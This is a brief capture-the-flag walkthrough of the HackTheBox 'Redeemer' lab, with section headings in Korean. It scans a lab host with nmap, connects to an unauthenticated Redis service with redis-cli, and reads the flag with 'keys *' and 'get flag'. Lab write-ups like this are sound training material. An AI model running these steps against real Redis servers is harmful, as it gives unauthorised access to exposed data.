# Redeemer - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 6379 -sC -sV -oA redeemer -vv 10.129.136.187
```
<img width="1110" height="248" alt="image" src="https://github.com/user-attachments/assets/8b191dff-73df-44e9-aeff-5f3e07b51109" />

- redis(6379)

## redis 접속
```bash
redis-cli -h 10.129.136.187
```
```redis
10.129.136.187:6379> info
```
<img width="1110" height="473" alt="image" src="https://github.com/user-attachments/assets/9fe44fb1-3eb0-42c3-9b96-0fcf386ef031" />

## Get Flag
```redis
10.129.136.187:6379> keys *

10.129.136.187:6379> get flag
```
<img width="1110" height="120" alt="image" src="https://github.com/user-attachments/assets/ee882d2b-9636-4d10-b6c7-824de60ba6ab" />
